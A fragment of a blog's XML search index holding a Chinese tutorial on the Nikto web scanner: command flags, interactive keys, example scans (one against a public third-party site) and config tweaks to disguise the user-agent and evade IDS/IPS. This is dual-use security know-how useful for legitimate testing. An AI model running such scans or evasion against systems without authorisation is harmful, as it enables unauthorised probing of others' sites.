<h3 id="实战很重要，需要自己不断尝试。"><a href="#实战很重要，需要自己不断尝试。" class="headerlink" title="实战很重要，需要自己不断尝试。"></a>实战很重要，需要自己不断尝试。</h3>]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>AWVS</tag>
      </tags>
  </entry>
  <entry>
    <title>Nikto详细使用教程</title>
    <url>/2022/08/12/nikto-shi-yong-jiao-cheng/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><p>基于perl语言开发的web页面扫描器。其特点扫描全面，速度快。</p>
<h2 id="nikto常用命令"><a href="#nikto常用命令" class="headerlink" title="nikto常用命令"></a>nikto常用命令</h2><p>-upodate                         升级，更新插件</p>
<p>-host                               扫描目标URl</p>
<p>-id username:password  http认证接口</p>
<p>-list-plugins                     列出所有可用的插件</p>
<p>-evasion                          IDS&#x2F;IPS逃避技术（实例演示里有详细信息）</p>
<p>-port                                指定端口（默认80）</p>
<p> -ssl                                 使用SSL</p>
<p>-useproxy                       使用http代理</p>
<p>-vhost  域名                    当一个IP拥有多个网站时 使用</p>
<h2 id="nikto交互参数（扫描过程中使用）"><a href="#nikto交互参数（扫描过程中使用）" class="headerlink" title="nikto交互参数（扫描过程中使用）"></a>nikto交互参数（扫描过程中使用）</h2><p>空格        报告当前扫描状态</p>
<p>v             显示详细信息</p>
<p>d             显示调试信息</p>
<p>e             显示http错误信息</p>
<p>p             显示扫描进度</p>
<p>r              显示重定向信息</p>
<p>c             显示cookie</p>
<p>a             显示身份认证过程</p>
<p>q             退出程序</p>
<p>N            扫描下一个目标</p>
<p>P            暂停扫描</p>
<p><strong>1.扫描单个地址时</strong></p>
<p>nikto  -host <a href="http://192.168.0.3/">http://192.168.3</a></p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686192629/n1_iycdpf.png"></p>
<p><strong>2.扫描多个地址时</strong></p>
<p>nikto -host  url.txt</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686192749/n2_kze1fv.png"></p>
<p><strong>3.扫描https网站</strong></p>
<p>nikto  -host  <a href="http://www.baidu.com/">www.baidu.com</a>  -ssl  -port 443</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686192819/n3_jyryez.png"></p>
<h3 id="修改配置信息"><a href="#修改配置信息" class="headerlink" title="修改配置信息"></a>修改配置信息</h3><p><strong>1.将user-agent:nikto改为其他浏览器标识，避免被识别出来。</strong></p>
<p> vi &#x2F;etc&#x2F;nikto.conf</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686193056/n4_lqcvki.png"></p>
<p><strong>2.如果是基于表单的认证，必须要使用cookie，将原来的cookie注释，按照原来的格式写入你的cookie。</strong></p>
<p>STATIC-COOKIE &#x3D; “cooke1&#x3D;cookie value1”; “cookie2&#x3D;value2”； </p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686193134/n5_xza91k.png"></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>Nikto</tag>
      </tags>
  </entry>
</search>
